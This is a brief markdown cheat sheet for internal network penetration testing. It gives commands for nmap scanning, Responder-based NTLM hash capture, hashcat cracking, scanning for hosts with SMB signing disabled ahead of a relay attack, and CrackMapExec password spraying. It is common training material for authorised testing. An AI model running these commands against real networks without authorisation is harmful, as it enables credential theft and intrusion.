# Internal Network Pentesting
Notes for Internal Network Pentesting 


###  Nmap

```bash
nmap -sn 192.168.1.1/24
```
```bash
nmap -sV -sC -A -p- IP-Address
```

###  Responder

```bash
responder -I <interface> -rdw
```
- After capturing NTLM Hash (copy the captured hash into .txt format) copy full hash from username to end of the hash.

```bash
hashcat -m 5600 hash.txt /path/to/wordlist.txt
```

### SMB Relay attack

- Scanning for Signing disabled machines, make sure you save the host example : TargetHost.txt
```bash
nmap --script=smb2-security-mode.nse -p 445 192.168.1.1/24,134 -Pn --open
```
- Make sure you make turn off the SMB and HTTP from responder configuration

```bash
nano /etc/responder/Responder.conf
```

### CrackMapExec 

```bash
crackmapexec smb "10.0.9.0/24" -u "FirstName.LastName" -p /path/to/password.txt
```




